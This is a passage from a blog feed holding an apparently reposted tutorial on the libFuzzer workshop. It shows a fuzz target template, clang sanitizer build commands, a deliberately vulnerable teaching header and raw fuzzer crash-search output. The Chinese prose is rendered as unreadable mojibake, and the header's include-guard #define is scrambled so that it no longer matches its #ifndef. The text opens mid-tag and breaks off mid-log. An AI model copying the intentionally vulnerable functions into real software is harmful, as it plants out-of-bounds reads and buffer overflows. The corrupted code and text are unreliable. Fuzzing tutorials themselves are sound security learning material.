class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>è¿™ä¸€ç¯‡æ“ä½œä¸‹æ¥æˆ‘æ„Ÿè§‰åˆ°å¯¹äºæé«˜libfuzzerçš„æ•ˆç‡åŒ…æ‹¬åœ¨ç¼–è¯‘æ’æ¡©ã€å­—å…¸ä½¿ç”¨ã€è¯­æ–™åº“é€‰æ‹©æ–¹é¢æœ‰äº†æ›´æ¸…æ¥šçš„è®¤è¯†ã€‚æ¨¡ç³Šæµ‹è¯•fuzzåœ¨è½¯ä»¶è¯ç”Ÿæ—¶å°±åº”è¿è€Œç”Ÿäº†ï¼Œç»è¿‡äº†å¦‚æ­¤é•¿æ—¶é—´çš„å‘å±•ï¼Œå¯¹äººä»¬å®ƒçš„ç ”ç©¶ä¹Ÿåœ¨ä¸æ–­æ·±å…¥ï¼Œå¹¶ä¸”æ ¹æ®ä¸åŒçš„éœ€æ±‚å¼€å‘å‡ºäº†å¾ˆå¤šä¸ªæ€§åŒ–çš„fuzzå·¥å…·ã€‚æ­£æ‰€è°“ç†è®ºç»“åˆå®è·µï¼Œè¦æƒ³å¯¹libfuzzeræœ‰æ›´æ·±å…¥çš„äº†è§£ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦å»åˆ†æå®ƒçš„æºç ï¼Œå‚è€ƒå„ç§ç ”ç©¶paperã€‚</p><p>åˆå­¦libfuzzerï¼Œæœ‰é”™è¯¯ç–å¿½ä¹‹å¤„çƒ¦è¯·å„ä½å¸ˆå‚…æŒ‡æ­£ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> FUZZ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰</title>
      <link href="/2020/12/17/LibFuzzer(1)/"/>
      <url>/2020/12/17/LibFuzzer(1)/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼š<a href="https://www.anquanke.com/post/id/224823">https://www.anquanke.com/post/id/224823</a></p><h3 id="LibFuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰"><a href="#LibFuzzer-workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰" class="headerlink" title="LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰"></a>LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰</h3><blockquote><p>æœ€è¿‘åšé¡¹ç›®å¼€å§‹ä¸Šæ‰‹å­¦ä¹ libfuzzerï¼Œæ˜¯è·Ÿç€libfuzzer-workshopå­¦çš„ã€‚å†™ä¸‹è‡ªå·±çš„å¿ƒå¾—å’Œæ”¶è·ã€‚</p></blockquote><span id="more"></span><p>å®˜æ–¹ç»™å‡ºçš„å®šä¹‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LibFuzzer is in-process, coverage-guided, evolutionary fuzzing engine.</span><br><span class="line">LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka â€œtarget functionâ€); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVMâ€™s SanitizerCoverage instrumentation.</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡ä¸è¦è¿›è¡Œfuzzçš„åº“è¿æ¥ï¼Œå¹¶å°†libfuzzerç”Ÿæˆçš„è¾“å…¥é€šè¿‡æ¨¡ç³Šæµ‹è¯•è¿›å…¥ç‚¹(fuzz target)å–‚ç»™è¦fuzzçš„åº“è¿›è¡Œfuzz testingã€‚åŒæ—¶fuzzerä¼šè·Ÿè¸ªå“ªäº›åŒºåŸŸçš„ä»£ç å·²ç»è¢«æµ‹è¯•è¿‡çš„ï¼Œå¹¶ä¸”æ ¹æ®ç§æ–™åº“çš„è¾“å…¥è¿›è¡Œå˜å¼‚æ¥ä½¿å¾—ä»£ç è¦†ç›–ç‡æœ€å¤§åŒ–ã€‚ä»£ç è¦†ç›–ç‡çš„ä¿¡æ¯æ˜¯ç”±LLVMâ€™s SanitizerCoverageæ’æ¡©æä¾›çš„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™å‡ ä¸ªlibfuzzerçš„ç‰¹æ€§ï¼šin-processæŒ‡è¿›ç¨‹å†…ã€‚å³libfuzzeråœ¨fuzzæ—¶å¹¶ä¸æ˜¯äº§ç”Ÿå‡ºå¤šä¸ªè¿›ç¨‹æ¥åˆ†åˆ«å¤„ç†ä¸åŒçš„è¾“å…¥ï¼Œè€Œæ˜¯å°†æ‰€æœ‰çš„æµ‹è¯•æ•°æ®æ”¾å…¥è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ã€‚coverage-guidedæŒ‡è¦†ç›–ç‡æŒ‡å¯¼çš„ã€‚å³ä¼šè¿›è¡Œä»£ç è¦†ç›–ç‡çš„è®¡ç®—ï¼Œæ­£å¦‚å®šä¹‰æ‰€è¯´çš„ä½¿å¾—ä¸æ–­å¢å¤§ä»£ç è¦†ç›–ç‡ã€‚evolutionaryæ˜¯æŒ‡libfuzzeræ˜¯è¿›åŒ–å‹çš„fuzzï¼Œç»“åˆäº†äº§ç”Ÿå’Œå˜å¼‚ä¸¤ç§å½¢å¼ã€‚</p><h4 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h4><p>è·Ÿç€<a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a> æ­å»ºå°±å¥½äº†ï¼Œä¸»è¦æ˜¯build llvmçš„ç¯å¢ƒå¯èƒ½è¦makeä¸€ä¼šå„¿ã€‚ç¼–è¯‘å¥½åæ‹¿åˆ°libfuzzer.a(é™æ€é“¾æ¥åº“æ–‡ä»¶)ï¼Œå°±å¯ä»¥å¼€å§‹ä¸Šæ‰‹å®è·µäº†ã€‚</p><h4 id="fuzz-testing"><a href="#fuzz-testing" class="headerlink" title="fuzz testing"></a>fuzz testing</h4><p>libfuzzerå·²ç»æä¾›äº†æ•°æ®æ ·æœ¬ç”Ÿæˆå’Œå¼‚å¸¸æ£€æµ‹åŠŸèƒ½ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯è¦å®ç°æ¨¡ç³Šæµ‹è¯•è¿›å…¥ç‚¹(fuzz target)ï¼Œå°†libfuzzerç”Ÿæˆçš„æ•°æ®äº¤ç»™ç›®æ ‡ç¨‹åºå¤„ç†ã€‚<br>fuzz targetç¼–å†™æ¨¡æ¿ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingInterestingWithMyAPI(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>LLVMFuzzerTestOneInput</code>å‡½æ•°å³ä½¿æˆ‘ä»¬è¦å®ç°çš„æ¥å£å‡½æ•°ï¼Œä»–çš„ä¸¤ä¸ªå‚æ•°Data(libfuzzerçš„æµ‹è¯•æ ·æœ¬æ•°æ®)ï¼Œsize(æ ·æœ¬æ•°æ®çš„å¤§å°)ã€‚<br><code>DoSomethingInterestingWithMyAPI</code>å‡½æ•°å³æˆ‘ä»¬å®é™…è¦è¿›è¡Œfuzzçš„å‡½æ•°ã€‚</p><h5 id="ç¼–è¯‘-ccæ–‡ä»¶ï¼š"><a href="#ç¼–è¯‘-ccæ–‡ä»¶ï¼š" class="headerlink" title="ç¼–è¯‘.ccæ–‡ä»¶ï¼š"></a>ç¼–è¯‘.ccæ–‡ä»¶ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clang++ -g -O1 -fsanitize=fuzzer,address \</span><br><span class="line">fuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \</span><br><span class="line">-o fuzzer_target</span><br></pre></td></tr></table></figure><p>å‡ ä¸ªå‚æ•°ï¼š<br>-g å¯é€‰å‚æ•°ï¼Œä¿ç•™è°ƒè¯•ç¬¦å·ã€‚<br>-O1 æŒ‡å®šä¼˜åŒ–ç­‰çº§ä¸º1<br>-fsanitize æŒ‡å®šsanitizeã€‚<br>fuzzeræ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥å¯ç”¨libfuzzerã€‚è¿˜å¯ä»¥é™„åŠ çš„å…¶ä»–sanitizeæœ‰ï¼šaddress(ç”¨æ¥æ£€æµ‹å†…å­˜è®¿é—®ç›¸å…³çš„é”™è¯¯ï¼Œå¦‚stack_overflow,heap_overflow,uaf,å¯ä»¥ä¸fuzzerä¸€èµ·ä½¿ç”¨)ï¼›memory(æ£€æµ‹æœªåˆå§‹åŒ–å†…å­˜çš„è®¿é—®ï¼Œåº”å•ç‹¬ä½¿ç”¨)ï¼›undefined(æ£€æµ‹å…¶ä»–çš„æ¼æ´ï¼Œå¦‚æ•´æ•°æº¢å‡ºï¼Œç±»å‹æ··æ·†ç­‰æœªå®šä¹‰çš„æ¼æ´)<br>æ³¨ï¼š-fsanitize-coverage&#x3D;trace-pc-guardé€‰é¡¹åœ¨é«˜ç‰ˆæœ¬çš„clangä¸­å·²ä¸å†é€‚ç”¨ï¼Œä»£ç çš„è¦†ç›–ç‡æƒ…å†µé»˜è®¤è‡ªåŠ¨å¼€å¯ã€‚</p><p>è¿™ä¸€æ­¥éª¤æ•´ä½“è¿‡ç¨‹å°±æ˜¯é€šè¿‡clangçš„-fsanitize&#x3D;fuzzeré€‰é¡¹å¯ä»¥å¯ç”¨libFuzzerï¼Œè¿™ä¸ªé€‰é¡¹åœ¨ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹ä¸­ç”Ÿæ•ˆï¼Œå®ç°äº†æ¡ä»¶åˆ¤æ–­è¯­å¥å’Œåˆ†æ”¯æ‰§è¡Œçš„è®°å½•ï¼Œå¹¶ä¸”è¾…ä»¥libFuzzerä¸­çš„åº“å‡½æ•°(libfuzzer.a)ï¼Œé€šè¿‡ç”Ÿæˆä¸åŒçš„æµ‹è¯•æ ·ä¾‹ç„¶åèƒ½å¤Ÿè·å¾—ä»£ç çš„è¦†ç›–ç‡æƒ…å†µï¼Œæœ€ç»ˆå®ç°æ‰€è°“çš„fuzz testingã€‚</p><h5 id="å¼€å§‹fuzz"><a href="#å¼€å§‹fuzz" class="headerlink" title="å¼€å§‹fuzz"></a>å¼€å§‹fuzz</h5><h6 id="å…ˆæ¥lesson-04ï¼Œè¦æµ‹è¯•çš„åº“æ˜¯vulnerable-functions-hï¼š"><a href="#å…ˆæ¥lesson-04ï¼Œè¦æµ‹è¯•çš„åº“æ˜¯vulnerable-functions-hï¼š" class="headerlink" title="å…ˆæ¥lesson 04ï¼Œè¦æµ‹è¯•çš„åº“æ˜¯vulnerable_functions.hï¼š"></a>å…ˆæ¥lesson 04ï¼Œè¦æµ‹è¯•çš„åº“æ˜¯vulnerable_functions.hï¼š</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LESSLE_FONS_04_VULNERABUNCTIONS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction1</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">    result = data[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">1</span>] == <span class="string">&#x27;U&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">2</span>] == <span class="string">&#x27;Z&#x27;</span> &amp;&amp;</span><br><span class="line">             data[<span class="number">3</span>] == <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">template&lt;class T&gt;</span><br><span class="line">typename T::value_type <span class="title function_">DummyHash</span><span class="params">(<span class="type">const</span> T&amp; buffer)</span> &#123;</span><br><span class="line">  typename T::value_type hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> value : buffer)</span><br><span class="line">    hash ^= value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">constexpr <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="keyword">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="keyword">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">header</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.c_str()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, body.data());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = DummyHash(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="built_in">std</span>::<span class="type">size_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// LESSONS_04_VULNERABLE_FUNCTIONS_H_</span></span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹VulnerableFunction1()ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°data&#x2F;sizeï¼Œå½“size&gt;3æ—¶ä¼šäº§ç”Ÿæ•°ç»„è¶Šç•Œã€‚æ¥ä¸‹æ¥ç¼–å†™æµ‹è¯•æ¥å£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//first_fuzzer.cc</span></span><br><span class="line"><span class="comment">// Copyright 2016 Google Inc. All Rights Reserved.</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  VulnerableFunction1(data, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥å°†Libfuzzerç”Ÿæˆçš„æµ‹è¯•æ ·ä¾‹ç»™åˆ°VulnerableFunction1å°±å¥½ã€‚<br>æ¥ä¸‹æ¥ç¼–è¯‘ï¼š<br><code>clang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/Fuzzer/libFuzzer.a -o first_fuzzer</code><br>ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºfirst_fuzzerã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1</span><br><span class="line">./first_fuzz corpus1</span><br></pre></td></tr></table></figure><p>corpus1æ˜¯æˆ‘ä»¬æä¾›çš„è¯­æ–™åº“ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¯¥è¯­æ–™åº“åº”è¯¥ä¸ºè¢«æµ‹ä»£ç æä¾›å„ç§æœ‰æ•ˆå’Œæ— æ•ˆçš„è¾“å…¥ï¼Œæ¨¡ç³Šå™¨åŸºäºå½“å‰è¯­æ–™åº“ä¸­çš„æ ·æœ¬è¾“å…¥ç”Ÿæˆéšæœºçªå˜ã€‚å¦‚æœçªå˜è§¦å‘äº†æµ‹è¯•ä»£ç ä¸­å…ˆå‰æœªè¦†ç›–çš„è·¯å¾„çš„æ‰§è¡Œï¼Œåˆ™è¯¥çªå˜å°†ä¿å­˜åˆ°è¯­æ–™åº“ä¸­ä»¥ä¾›å°†æ¥å˜æ›´ã€‚å½“ç„¶LibFuzzerä¹Ÿå¯ä»¥æ²¡æœ‰ä»»ä½•åˆå§‹ç§å­çš„æƒ…å†µä¸‹å·¥ä½œï¼ˆå› ä¸ºä¸Šé¢æåˆ°ä»–æ˜¯evolutionaryå‹çš„fuzzerï¼‰ï¼Œä½†å¦‚æœå—æµ‹è¯•çš„åº“æ¥å—å¤æ‚çš„ç»“æ„åŒ–è¾“å…¥ï¼Œåˆ™ä¼šå› ä¸ºéšæœºäº§ç”Ÿçš„æ ·ä¾‹ä¸æ˜“ç¬¦åˆå¯¼è‡´æ•ˆç‡é™ä½ã€‚<br>å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¤ªå¤šçš„æ ·ä¾‹å¹¶å¸Œæœ›èƒ½å¤Ÿç²¾ç®€ä¸€ä¸‹ï¼Œåˆ™å¯ä»¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1_min</span><br><span class="line">./first_fuzzer -merge=1 corpus1_min corpus1</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œcorpus1_minå°†ä¼šå­˜æ”¾ç²¾ç®€åçš„è¾“å…¥æ ·ä¾‹ã€‚</p><p>è¿è¡Œåå¾—åˆ°crashï¼Œå¾ˆå¿«å•Šï¼ï¼ï¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">04</span> git:(master) âœ— ./first_fuzzer corpus1 </span><br><span class="line">INFO: Seed: <span class="number">2222548757</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">35</span> inline <span class="number">8</span>-bit counters): <span class="number">35</span> [<span class="number">0x7f7120</span>, <span class="number">0x7f7143</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">35</span> PCs): <span class="number">35</span> [<span class="number">0x5b7a68</span>,<span class="number">0x5b7c98</span>), </span><br><span class="line">INFO:        <span class="number">0</span> files found in corpus1</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">3</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">3</span>NEW    cov: <span class="number">4</span> ft: <span class="number">4</span> corp: <span class="number">2</span>/<span class="number">4</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">1</span> CMP- DE: <span class="string">&quot;\x00\x00&quot;</span>-</span><br><span class="line">#<span class="number">1190</span>NEW    cov: <span class="number">5</span> ft: <span class="number">5</span> corp: <span class="number">3</span>/<span class="number">7</span>b lim: <span class="number">14</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">2</span> ChangeBinInt-CMP- DE: <span class="string">&quot;F\x00&quot;</span>-</span><br><span class="line">#<span class="number">12191</span>NEW    cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">11</span>b lim: <span class="number">122</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> InsertByte-</span><br><span class="line">#<span class="number">12297</span>REDUCE cov: <span class="number">6</span> ft: <span class="number">6</span> corp: <span class="number">4</span>/<span class="number">10</span>b lim: <span class="number">122</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">3</span>/<span class="number">3</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17213</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">40</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">30</span>/<span class="number">30</span> MS: <span class="number">1</span> InsertRepeatedBytes-</span><br><span class="line">#<span class="number">17274</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">27</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">17</span>/<span class="number">17</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17356</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">24</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">14</span>/<span class="number">14</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">17437</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">18</span>b lim: <span class="number">170</span> exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">17458</span>REDUCE cov: <span class="number">7</span> ft: <span class="number">7</span> corp: <span class="number">5</span>/<span class="number">14</span>b lim: <span class="number">170</span> exec/s: <span 